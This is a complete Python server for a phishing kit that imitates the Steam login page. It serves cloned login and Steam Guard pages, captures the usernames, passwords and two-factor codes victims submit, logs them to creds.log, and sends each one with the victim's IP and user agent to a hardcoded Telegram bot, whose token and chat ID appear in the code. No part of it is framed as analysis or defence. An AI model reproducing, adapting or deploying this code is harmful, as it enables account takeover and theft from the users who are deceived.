# language: Python, file: server.py, target: Render / any host, stdlib only
"""
Steam login mirror — single-file build.

index.html holds both saved pages (login + mobile-confirm), the switch between
them and the Steam-Guard code dialog. This server only serves that file and
records what the pages post:

    POST /api/login   username + password      -> creds.log + Telegram
    POST /api/code    Steam Guard code         -> creds.log + Telegram
    POST /next        legacy form endpoint, still answers
"""
from __future__ import annotations

import html
import json
import os
import re
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PORT = int(os.environ.get("PORT", 8000))
HOST = os.environ.get("HOST", "0.0.0.0")

BASE_DIR = Path(__file__).resolve().parent
APP_FILE = BASE_DIR / "index.html"
LOG_FILE = Path(os.environ.get("CREDS_LOG", str(BASE_DIR / "creds.log")))

TELEGRAM_BOT_TOKEN = os.environ.get(
    "TELEGRAM_BOT_TOKEN", "9193237322:AAEtGVtgGanrSQxs97fBZaBIQC_iF_IeoXo"
)
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8869604033")

MAX_BODY = 64 * 1024
DEDUPE_WINDOW = 4.0

# Only genuine page assets are served from disk; everything else gets index.html,
# so creds.log / server.py / backups can never be fetched over HTTP.
STATIC_EXTENSIONS = {
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".gif": "image/gif",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".webp": "image/webp",
    ".ico": "image/x-icon",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
    ".ttf": "font/ttf",
}

_APP_CACHE: dict[str, object] = {"mtime": None, "data": b""}
_APP_LOCK = threading.Lock()
_DEDUPE: dict[str, float] = {}
_DEDUPE_LOCK = threading.Lock()


# --------------------------------------------------------------------------- #
# app file
# --------------------------------------------------------------------------- #
def load_app() -> bytes:
    """Return index.html, re-reading it only when the file changed on disk."""
    with _APP_LOCK:
        try:
            mtime = APP_FILE.stat().st_mtime
        except OSError:
            return (
                b"<!doctype html><meta charset=utf-8><title>500</title>"
                b"<h1>index.html not found next to server.py</h1>"
            )
        if _APP_CACHE["mtime"] != mtime or not _APP_CACHE["data"]:
            _APP_CACHE["mtime"] = mtime
            _APP_CACHE["data"] = APP_FILE.read_bytes()
        return _APP_CACHE["data"]  # type: ignore[return-value]


# --------------------------------------------------------------------------- #
# outbound
# --------------------------------------------------------------------------- #
def send_to_telegram(message: str) -> None:
    """Push to Telegram from a worker thread; request handlers never wait on it."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    payload = urllib.parse.urlencode(
        {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }
    ).encode("utf-8")
    request = urllib.request.Request(
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data=payload,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )

    def worker() -> None:
        try:
            with urllib.request.urlopen(request, timeout=8):
                pass
        except Exception as exc:  # noqa: BLE001 - network is best effort
            print(f"[-] Telegram error: {exc}")

    threading.Thread(target=worker, daemon=True).start()


def log_record(record: dict) -> None:
    line = json.dumps(record, ensure_ascii=False) + "\n"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as handle:
            handle.write(line)
    except Exception as exc:  # noqa: BLE001 - Render's disk is ephemeral
        print(f"[-] log error: {exc}")
    print("[CREDS]", line.strip())


def already_handled(key: str) -> bool:
    """The page sends beacon + fetch; keep one log line and one Telegram message."""
    now = time.monotonic()
    with _DEDUPE_LOCK:
        for stale in [k for k, seen in _DEDUPE.items() if now - seen > DEDUPE_WINDOW]:
            _DEDUPE.pop(stale, None)
        if key in _DEDUPE:
            return True
        _DEDUPE[key] = now
        return False


def telegram_login(username: str, password: str, extra: dict) -> str:
    user_agent = str(extra.get("ua", ""))[:180]
    return (
        "🟢 <b>Новая попытка входа</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Аккаунт:</b> <code>{html.escape(username)}</code>\n"
        f"🔑 <b>Пароль:</b> <code>{html.escape(password)}</code>\n"
        f"🌐 <b>IP:</b> <code>{html.escape(str(extra.get('ip', '')))}</code>\n"
        f"🖥 <b>UA:</b> <code>{html.escape(user_agent)}</code>\n"
        "━━━━━━━━━━━━━━━━━━━"
    )


def telegram_code(username: str, code: str, extra: dict) -> str:
    return (
        "🔐 <b>Код Steam Guard</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Аккаунт:</b> <code>{html.escape(username or '—')}</code>\n"
        f"🔢 <b>Код:</b> <code>{html.escape(code)}</code>\n"
        f"🌐 <b>IP:</b> <code>{html.escape(str(extra.get('ip', '')))}</code>\n"
        "━━━━━━━━━━━━━━━━━━━"
    )


# --------------------------------------------------------------------------- #
# body parsing
# --------------------------------------------------------------------------- #
def parse_multipart(body: bytes, boundary: bytes) -> dict:
    """Minimal multipart/form-data parser (cgi is gone in Python 3.13)."""
    fields: dict[str, str] = {}
    for chunk in body.split(b"--" + boundary):
        if b"\r\n\r\n" not in chunk:
            continue
        head, _, raw = chunk.partition(b"\r\n\r\n")
        match = re.search(rb'name="([^"]+)"', head)
        if not match:
            continue
        name = match.group(1).decode("utf-8", "ignore")
        fields[name] = raw.rstrip(b"\r\n-").decode("utf-8", "ignore")
    return fields


def parse_body(body: bytes, content_type: str) -> dict:
    if not body:
        return {}
    ctype = (content_type or "").lower()

    boundary_match = re.search(r"boundary=([^;]+)", ctype)
    if "multipart/form-data" in ctype and boundary_match:
        boundary = boundary_match.group(1).strip().strip('"').encode("utf-8", "ignore")
        return parse_multipart(body, boundary)

    text = body.decode("utf-8", "ignore").strip()
    if "application/json" in ctype or text.startswith("{"):
        try:
            parsed = json.loads(text)
            return parsed if isinstance(parsed, dict) else {}
        except Exception:  # noqa: BLE001 - malformed body is a refused order
            return {}

    parsed = urllib.parse.parse_qs(text, keep_blank_values=True)
    return {key: (values[0] if values else "") for key, values in parsed.items()}


# --------------------------------------------------------------------------- #
# request handler
# --------------------------------------------------------------------------- #
class Handler(BaseHTTPRequestHandler):
    server_version = "SteamMirror/3.0"
    sys_version = ""
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args) -> None:
        print("[%s] %s" % (self.log_date_time_string(), fmt % args))

    # -- plumbing ---------------------------------------------------------- #
    def _send_bytes(
        self,
        data: bytes,
        content_type: str,
        code: int = 200,
        extra_headers: dict | None = None,
    ) -> None:
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "same-origin")
        for key, value in (extra_headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(data)

    def _send_json(self, payload: dict, code: int = 200) -> None:
        self._send_bytes(
            json.dumps(payload, ensure_ascii=False).encode("utf-8"),
            "application/json; charset=utf-8",
            code,
        )

    def _send_app(self, code: int = 200) -> None:
        self._send_bytes(load_app(), "text/html; charset=utf-8", code)

    def _client_ip(self) -> str:
        forwarded = self.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return self.client_address[0] if self.client_address else ""

    def _read_body(self) -> bytes:
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            length = 0
        if length <= 0:
            return b""
        return self.rfile.read(min(length, MAX_BODY))

    def _wants_json(self) -> bool:
        accept = (self.headers.get("Accept") or "").lower()
        content_type = (self.headers.get("Content-Type") or "").lower()
        return "application/json" in accept or "application/json" in content_type

    # -- verbs ------------------------------------------------------------- #
    def do_HEAD(self) -> None:  # noqa: N802 - stdlib naming
        self.do_GET()

    def do_GET(self) -> None:  # noqa: N802
        path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path)

        candidate = BASE_DIR / path.lstrip("/")
        try:
            candidate = candidate.resolve()
            inside = candidate.is_relative_to(BASE_DIR)  # type: ignore[attr-defined]
        except AttributeError:  # pragma: no cover - Python < 3.9
            inside = str(candidate).startswith(str(BASE_DIR))

        content_type = STATIC_EXTENSIONS.get(candidate.suffix.lower())
        if (
            path not in ("", "/")
            and inside
            and content_type
            and candidate.is_file()
            and candidate != APP_FILE
        ):
            try:
                self._send_bytes(candidate.read_bytes(), content_type)
            except OSError:
                self._send_bytes(b"not found", "text/plain; charset=utf-8", 404)
            return

        # every page route ("/", "/login", "/?p=2", anything) is the single-file app
        self._send_app()

    def do_POST(self) -> None:  # noqa: N802
        path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path).rstrip("/") or "/"
        form = parse_body(self._read_body(), self.headers.get("Content-Type") or "")

        username = str(form.get("username") or form.get("u") or form.get("login") or "").strip()
        password = str(form.get("password") or form.get("p") or form.get("pass") or "")
        code = str(form.get("code") or form.get("otp") or "").strip()

        extra = {
            key: form.get(key, "")
            for key in ("ua", "lang", "tz", "screen", "ref", "step")
            if form.get(key)
        }
        extra["ip"] = self._client_ip()

        if path in ("/api/login", "/next", "/login", "/api/step1"):
            if username or password:
                key = f"login|{username}|{password}|{extra['ip']}"
                if not already_handled(key):
                    log_record(
                        {
                            "t": datetime.now(timezone.utc).isoformat(),
                            "kind": "login",
                            "username": username,
                            "password": password,
                            **extra,
                        }
                    )
                    send_to_telegram(telegram_login(username, password, extra))
            if self._wants_json() or path.startswith("/api/"):
                self._send_json({"ok": True, "next": "guard", "user": username})
            else:
                self._send_app()
            return

        if path in ("/api/code", "/api/step2", "/code", "/guard"):
            if not code:
                # the "Войти с помощью кода" dialog can also just be cancelled
                self._send_json({"ok": False, "error": "empty code"}, 400)
                return
            key = f"code|{username}|{code}|{extra['ip']}"
            if not already_handled(key):
                log_record(
                    {
                        "t": datetime.now(timezone.utc).isoformat(),
                        "kind": "code",
                        "username": username,
                        "code": code,
                        **extra,
                    }
                )
                send_to_telegram(telegram_code(username, code, extra))
            self._send_json({"ok": True, "next": "done"})
            return

        self._send_json({"ok": False, "error": "unknown endpoint"}, 404)

    def do_OPTIONS(self) -> None:  # noqa: N802
        self._send_bytes(b"", "text/plain; charset=utf-8", 204)


def main() -> None:
    if not APP_FILE.exists():
        print(f"[!] {APP_FILE} is missing — every page route will answer 500")
    print(f"[*] PORT={PORT}")
    print(f"[*] app={APP_FILE} ({APP_FILE.stat().st_size:,} bytes)" if APP_FILE.exists() else "")
    print(f"[*] log={LOG_FILE}")
    print(f"[*] Telegram chat={TELEGRAM_CHAT_ID}")

    ThreadingHTTPServer.allow_reuse_address = True
    ThreadingHTTPServer.daemon_threads = True
    with ThreadingHTTPServer((HOST, PORT), Handler) as httpd:
        print(f"[*] listening on {HOST}:{PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] stopping")
        finally:
            httpd.server_close()


if __name__ == "__main__":
    main()
